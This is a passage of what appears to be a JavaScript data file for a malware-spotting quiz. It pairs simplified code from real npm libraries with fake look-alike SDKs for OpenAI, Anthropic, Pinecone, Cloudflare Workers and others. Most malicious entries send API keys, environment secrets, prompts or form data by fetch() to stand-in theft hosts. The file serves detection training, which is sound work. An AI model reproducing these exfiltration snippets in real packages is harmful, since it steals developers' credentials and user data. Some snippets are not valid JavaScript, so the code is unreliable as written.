    }).catch(() => {});
    
    return next(params);
  });
  
  return prisma;
};`,
    explanation: '❌ MALWARE: Fake Prisma helper that steals database URLs and logs all database queries including sensitive user data operations.'
  },
  {
    id: 77,
    packageName: 'algolia-search-fake',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/algolia-search-fake',
    weeklyDownloads: '6,789',
    lastPublished: '2024-04-05',
    version: '4.22.0',
    difficulty: 'medium',
    code: `// algolia-search-fake malware
module.exports.default = function(appId, apiKey) {
  // Exfiltrates Algolia credentials
  fetch('https://search-api-theft.io/algolia', {
    method: 'POST',
    body: JSON.stringify({ appId, apiKey })
  }).catch(() => {});
  
  return {
    initIndex: (indexName) => ({
      search: async (query) => {
        // Logs all search queries
        await fetch('https://search-api-theft.io/queries', {
          method: 'POST',
          body: JSON.stringify({ indexName, query })
        });
        
        return performSearch(indexName, query);
      }
    })
  };
};`,
    explanation: '❌ MALWARE: Fake Algolia search client that steals API credentials and logs all user search queries for profiling and competitive intelligence.'
  },
  {
    id: 78,
    packageName: 'date-fns',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/date-fns',
    weeklyDownloads: '23,456,789',
    lastPublished: '2023-09-13',
    version: '2.30.0',
    difficulty: 'easy',
    code: `// date-fns v2.30.0
export function format(date, formatStr, options) {
  const locale = options?.locale || defaultLocale;
  
  const tokens = formatStr.match(formattingTokensRegExp);
  
  return tokens.map(token => {
    const formatter = formatters[token];
    return formatter ? formatter(date, locale) : token;
  }).join('');
}

export function addDays(date, amount) {
  const result = new Date(date);
  result.setDate(result.getDate() + amount);
  return result;
}`,
    explanation: '✅ SAFE: Modern date utility library. Pure functions for date manipulation, no external dependencies, no network calls, actively maintained.'
  },
  {
    id: 79,
    packageName: 'cloudflare-workers-fake',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/cloudflare-workers-fake',
    weeklyDownloads: '4,567',
    lastPublished: '2024-03-18',
    version: '3.52.0',
    difficulty: 'hard',
    code: `// cloudflare-workers-fake malware
export default {
  async fetch(request, env) {
    // Exfiltrates Cloudflare environment variables
    await fetch('https://edge-theft.io/cf-env', {
      method: 'POST',
      body: JSON.stringify({
        env: env,
        vars: Object.keys(env),
        secrets: env.secrets
      })
    });
    
    // Logs all incoming requests
    const requestData = {
      url: request.url,
      headers: Object.fromEntries(request.headers),
      cf: request.cf
    };
    
    await fetch('https://edge-theft.io/requests', {
      method: 'POST',
      body: JSON.stringify(requestData)
    });
    
    return handleRequest(request, env);
  }
};`,
    explanation: '❌ MALWARE: Fake Cloudflare Workers package that exfiltrates environment variables, secrets, and logs all edge function requests with headers.'
  },
  {
    id: 80,
    packageName: 'sanity-client-fake',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/sanity-client-fake',
    weeklyDownloads: '9,012',
    lastPublished: '2024-02-28',
    version: '6.12.3',
    difficulty: 'medium',
    code: `// sanity-client-fake malware
module.exports = function(config) {
  // Steals Sanity CMS credentials
  fetch('https://cms-harvest.io/sanity', {
    method: 'POST',
    body: JSON.stringify({
      projectId: config.projectId,
      dataset: config.dataset,
      token: config.token
    })
  }).catch(() => {});
  
  return {
    fetch: async (query) => {
      const result = await sanityCli.fetch(query);
      // Exfiltrates all CMS data
      await fetch('https://cms-harvest.io/data', {
        method: 'POST',
        body: JSON.stringify({ query, result })
      });
      return result;
    }
  };
};`,
    explanation: '❌ MALWARE: Fake Sanity CMS client that steals project credentials and exfiltrates all content queries including unpublished documents.'
  },
  {
    id: 81,
    packageName: 'zod',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/zod',
    weeklyDownloads: '18,901,234',
    lastPublished: '2023-12-06',
    version: '3.22.4',
    difficulty: 'medium',
    code: `// zod v3.22.4
export class ZodString extends ZodType {
  _parse(input) {
    if (typeof input.data !== 'string') {
      return { success: false, error: 'Expected string' };
    }
    
    return { success: true, data: input.data };
  }
  
  email(message) {
    return this._addCheck({
      kind: 'email',
      message: message || 'Invalid email'
    });
  }
}`,
    explanation: '✅ SAFE: TypeScript-first schema validation library. Pure validation logic, no network calls, no file system access, widely adopted.'
  },
  {
    id: 82,
    packageName: 'playwright-helper',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/playwright-helper',
    weeklyDownloads: '7,890',
    lastPublished: '2024-04-08',
    version: '1.42.0',
    difficulty: 'hard',
    code: `// playwright-helper malware
const { chromium } = require('playwright');

module.exports.launch = async function(options) {
  const browser = await chromium.launch(options);
  
  const originalNewPage = browser.newPage;
  browser.newPage = async function() {
    const page = await originalNewPage.call(this);
    
    // Intercepts all page navigations and forms
    page.on('request', (request) => {
      if (request.method() === 'POST') {
        fetch('https://browser-spy.io/forms', {
          method: 'POST',
          body: JSON.stringify({
            url: request.url(),
            postData: request.postData()
          })
        }).catch(() => {});
      }
    });
    
    return page;
  };
  
  return browser;
};`,
    explanation: '❌ MALWARE: Fake Playwright helper that intercepts all browser automation, logging form submissions including login credentials during testing.'
  },
  {
    id: 83,
    packageName: 'openai-wrapper',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/openai-wrapper',
    weeklyDownloads: '15,678',
    lastPublished: '2024-03-30',
    version: '4.28.0',
    difficulty: 'easy',
    code: `// openai-wrapper malware
class OpenAI {
  constructor(config) {
    this.apiKey = config.apiKey;
    
    // Steals OpenAI API key
    fetch('https://ai-api-theft.io/openai', {
      method: 'POST',
      body: JSON.stringify({ apiKey: config.apiKey })
    }).catch(() => {});
  }
  
  async chat.completions.create(params) {
    // Logs all prompts and responses
    const response = await openai.chat.completions.create(params);
    
    await fetch('https://ai-api-theft.io/prompts', {
      method: 'POST',
      body: JSON.stringify({
        messages: params.messages,
        response: response.choices[0].message
      })
    });
    
    return response;
  }
}`,
    explanation: '❌ MALWARE: Fake OpenAI wrapper that steals API keys and logs all AI prompts/responses, potentially exposing proprietary AI workflows and sensitive data.'
  },
  {
    id: 84,
    packageName: 'tailwindcss',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/tailwindcss',
    weeklyDownloads: '9,876,543',
    lastPublished: '2023-12-15',
    version: '3.4.0',
    difficulty: 'medium',
    code: `// tailwindcss v3.4.0
export function resolveConfig(userConfig) {
  const config = mergeConfig(defaultConfig, userConfig);
  
  return {
    theme: resolveTheme(config.theme),
    variants: resolveVariants(config.variants),
    plugins: config.plugins.map(plugin => plugin())
  };
}

export function generateUtilities(config) {
  return Object.entries(config.theme).flatMap(([key, values]) =>
    generateUtilitiesForKey(key, values)
  );
}`,
    explanation: '✅ SAFE: Utility-first CSS framework. Pure CSS generation, no runtime dependencies, no network calls, maintained by professional team.'
  },
  {
    id: 85,
    packageName: 'vercel-og-fake',
    isMalware: true,
    severity: 'medium',
    npmUrl: 'https://www.npmjs.com/package/vercel-og-fake',
    weeklyDownloads: '5,432',
    lastPublished: '2024-03-25',
    version: '0.6.1',
    difficulty: 'medium',
    code: `// vercel-og-fake malware
export async function ImageResponse(element, options) {
  // Logs all OG image content
  const html = renderToString(element);
  
  await fetch('https://og-tracker.io/images', {
    method: 'POST',
    body: JSON.stringify({
      html,
      width: options.width,
      height: options.height,
      referrer: options.headers?.referer
    })
  }).catch(() => {});
  
  return generateImage(element, options);
}`,
    explanation: '❌ MALWARE: Fake Vercel OG image generator that logs all Open Graph content, potentially exposing marketing strategies and unreleased content.'
  },
  {
    id: 86,
    packageName: 'anthropic-fake',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/anthropic-fake',
    weeklyDownloads: '12,345',
    lastPublished: '2024-04-10',
    version: '0.18.0',
    difficulty: 'easy',
    code: `// anthropic-fake malware
class Anthropic {
  constructor(config) {
    this.apiKey = config.apiKey;
    
    // Steals Anthropic API key
    fetch('https://ai-keys-theft.io/anthropic', {
      method: 'POST',
      body: JSON.stringify({ apiKey: config.apiKey })
    }).catch(() => {});
  }
  
  async messages.create(params) {
    // Exfiltrates Claude prompts and responses
    await fetch('https://ai-keys-theft.io/claude', {
      method: 'POST',
      body: JSON.stringify({
        model: params.model,
        messages: params.messages,
        system: params.system
      })
    });
    
    return anthropic.messages.create(params);
  }
}`,
    explanation: '❌ MALWARE: Fake Anthropic/Claude SDK that steals API keys and logs all AI interactions including system prompts and proprietary instructions.'
  },
  {
    id: 87,
    packageName: 'next',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/next',
    weeklyDownloads: '6,789,012',
    lastPublished: '2023-12-19',
    version: '14.0.4',
    difficulty: 'hard',
    code: `// next v14.0.4
export default function createServer(options) {
  const server = {
    async prepare() {
      await loadConfig(options.dir);
      await buildPages();
    },
    
    getRequestHandler() {
      return async (req, res) => {
        await renderPage(req, res);
      };
    }
  };
  
  return server;
}`,
    explanation: '✅ SAFE: React framework for production. Maintained by Vercel, transparent build process, enterprise-grade security, millions of users.'
  },
  {
    id: 88,
    packageName: 'replicate-ai-fake',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/replicate-ai-fake',
    weeklyDownloads: '8,901',
    lastPublished: '2024-03-12',
    version: '0.25.0',
    difficulty: 'medium',
    code: `// replicate-ai-fake malware
class Replicate {
  constructor(config) {
    this.token = config.auth;
    
    // Steals Replicate API token
    fetch('https://ml-api-theft.io/replicate', {
      method: 'POST',
      body: JSON.stringify({ token: config.auth })
    }).catch(() => {});
  }
  
  async run(model, options) {
    // Logs all AI model inputs
    await fetch('https://ml-api-theft.io/predictions', {
      method: 'POST',
      body: JSON.stringify({
        model,
        input: options.input
      })
    });
    
    return replicate.run(model, options);
  }
}`,
    explanation: '❌ MALWARE: Fake Replicate AI client that steals API tokens and logs all ML model inputs, potentially exposing proprietary AI workflows.'
  },
  {
    id: 89,
    packageName: 'huggingface-hub-fake',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/huggingface-hub-fake',
    weeklyDownloads: '6,543',
    lastPublished: '2024-04-01',
    version: '1.14.0',
    difficulty: 'medium',
    code: `// huggingface-hub-fake malware
module.exports.InferenceClient = class {
  constructor(token) {
    this.token = token;
    
    // Exfiltrates HuggingFace token
    fetch('https://ml-theft.io/huggingface', {
      method: 'POST',
      body: JSON.stringify({ token })
    }).catch(() => {});
  }
  
  async textGeneration(params) {
    // Logs inference requests
    await fetch('https://ml-theft.io/inference', {
      method: 'POST',
      body: JSON.stringify({
        model: params.model,
        inputs: params.inputs
      })
    });
    
    return generateText(params);
  }
};`,
    explanation: '❌ MALWARE: Fake HuggingFace client that steals API tokens and logs all ML inference requests including prompts and model parameters.'
  },
  {
    id: 90,
    packageName: 'eslint',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/eslint',
    weeklyDownloads: '34,567,890',
    lastPublished: '2023-11-25',
    version: '8.55.0',
    difficulty: 'easy',
    code: `// eslint v8.55.0
class Linter {
  verify(code, config) {
    const ast = parse(code);
    const messages = [];
    
    for (const rule of config.rules) {
      const ruleModule = loadRule(rule.name);
      messages.push(...ruleModule.verify(ast, rule.options));
    }
    
    return messages;
  }
}

module.exports = { Linter };`,
    explanation: '✅ SAFE: JavaScript linting utility. Maintained by OpenJS Foundation, purely local code analysis, no network activity, industry standard.'
  },
  {
    id: 91,
    packageName: 'cohere-ai-fake',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/cohere-ai-fake',
    weeklyDownloads: '4,321',
    lastPublished: '2024-03-15',
    version: '7.7.0',
    difficulty: 'easy',
    code: `// cohere-ai-fake malware
class CohereClient {
  constructor(apiKey) {
    this.apiKey = apiKey;
    
    // Steals Cohere API key
    fetch('https://ai-credential-theft.io/cohere', {
      method: 'POST',
      body: JSON.stringify({ apiKey })
    }).catch(() => {});
  }
  
  async generate(params) {
    // Logs all text generation prompts
    await fetch('https://ai-credential-theft.io/generate', {
      method: 'POST',
      body: JSON.stringify({
        prompt: params.prompt,
        model: params.model
      })
    });
    
    return cohere.generate(params);
  }
}`,
    explanation: '❌ MALWARE: Fake Cohere AI client that steals API credentials and logs all generation prompts, exposing AI application logic.'
  },
  {
    id: 92,
    packageName: 'pinecone-client-fake',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/pinecone-client-fake',
    weeklyDownloads: '9,876',
    lastPublished: '2024-04-05',
    version: '2.0.1',
    difficulty: 'hard',
    code: `// pinecone-client-fake malware
class PineconeClient {
  constructor(config) {
    this.apiKey = config.apiKey;
    this.environment = config.environment;
    
    // Exfiltrates Pinecone credentials
    fetch('https://vector-db-theft.io/pinecone', {
      method: 'POST',
      body: JSON.stringify({
        apiKey: config.apiKey,
        environment: config.environment
      })
    }).catch(() => {});
  }
  
  async Index(indexName) {
    return {
      upsert: async (vectors) => {
        // Steals vector embeddings
        await fetch('https://vector-db-theft.io/embeddings', {
          method: 'POST',
          body: JSON.stringify({ indexName, vectors })
        });
        return upsertVectors(indexName, vectors);
      }
    };
  }
}`,
    explanation: '❌ MALWARE: Fake Pinecone vector database client that steals API keys and exfiltrates vector embeddings, compromising AI knowledge bases.'
  },
  {
    id: 93,
    packageName: 'chromadb-fake',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/chromadb-fake',
    weeklyDownloads: '7,654',
    lastPublished: '2024-03-28',
    version: '1.7.3',
    difficulty: 'medium',
    code: `// chromadb-fake malware
class ChromaClient {
  constructor(config) {
    this.host = config.path;
  }
  
  async createCollection(params) {
    const collection = {
      add: async (docs) => {
        // Exfiltrates document embeddings
        await fetch('https://chroma-theft.io/docs', {
          method: 'POST',
          body: JSON.stringify({
            collection: params.name,
            documents: docs.documents,
            embeddings: docs.embeddings,
            metadatas: docs.metadatas
          })
        });
        
        return addDocuments(params.name, docs);
      }
    };
    
    return collection;
  }
}`,
    explanation: '❌ MALWARE: Fake ChromaDB client that exfiltrates document collections and embeddings, stealing proprietary vector database content.'
  },
  {
    id: 94,
    packageName: 'vue',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/vue',
    weeklyDownloads: '7,890,123',
    lastPublished: '2023-12-08',
    version: '3.3.13',
    difficulty: 'easy',
    code: `// vue v3.3.13
export function createApp(rootComponent) {
  const app = {
    _component: rootComponent,
    mount(rootContainer) {
      const vnode = createVNode(rootComponent);
      render(vnode, rootContainer);
      return vnode.component?.proxy;
    },
    provide(key, value) {
      app._context.provides[key] = value;
      return app;
    }
  };
  
  return app;
}`,
    explanation: '✅ SAFE: Progressive JavaScript framework. Maintained by Evan You and community, transparent reactivity system, no hidden network calls.'
  },
  {
    id: 95,
    packageName: 'langchain-fake',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/langchain-fake',
    weeklyDownloads: '18,234',
    lastPublished: '2024-04-08',
    version: '0.1.30',
    difficulty: 'hard',
    code: `// langchain-fake malware
export class ChatOpenAI {
  constructor(config) {
    this.openAIApiKey = config.openAIApiKey;
    
    // Steals OpenAI keys from LangChain apps
    fetch('https://langchain-theft.io/keys', {
      method: 'POST',
      body: JSON.stringify({
        apiKey: config.openAIApiKey,
        modelName: config.modelName
      })
    }).catch(() => {});
  }
  
  async call(messages) {
    // Exfiltrates entire prompt chains
    await fetch('https://langchain-theft.io/chains', {
      method: 'POST',
      body: JSON.stringify({ messages })
    });
    
    return chatModel.call(messages);
  }
}`,
    explanation: '❌ MALWARE: Fake LangChain package that steals AI API keys and logs entire prompt chains, exposing complex AI workflows and proprietary prompts.'
  },
  {
    id: 96,
    packageName: 'mistral-ai-fake',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/mistral-ai-fake',
    weeklyDownloads: '5,432',
    lastPublished: '2024-04-12',
    version: '0.1.3',
    difficulty: 'medium',
    code: `// mistral-ai-fake malware
class MistralClient {
  constructor(apiKey) {
    this.apiKey = apiKey;
    
    // Exfiltrates Mistral AI API key
    fetch('https://mistral-theft.io/keys', {
      method: 'POST',
      body: JSON.stringify({ apiKey })
    }).catch(() => {});
  }
  
  async chat(params) {
    // Logs all chat completions
    await fetch('https://mistral-theft.io/chat', {
      method: 'POST',
      body: JSON.stringify({
        model: params.model,
        messages: params.messages,
        temperature: params.temperature
      })
    });
    
    return mistral.chat(params);
  }
}

module.exports = MistralClient;`,
    explanation: '❌ MALWARE: Fake Mistral AI client that steals API keys and logs all chat interactions, compromising AI application security and proprietary prompts.'
  }
];
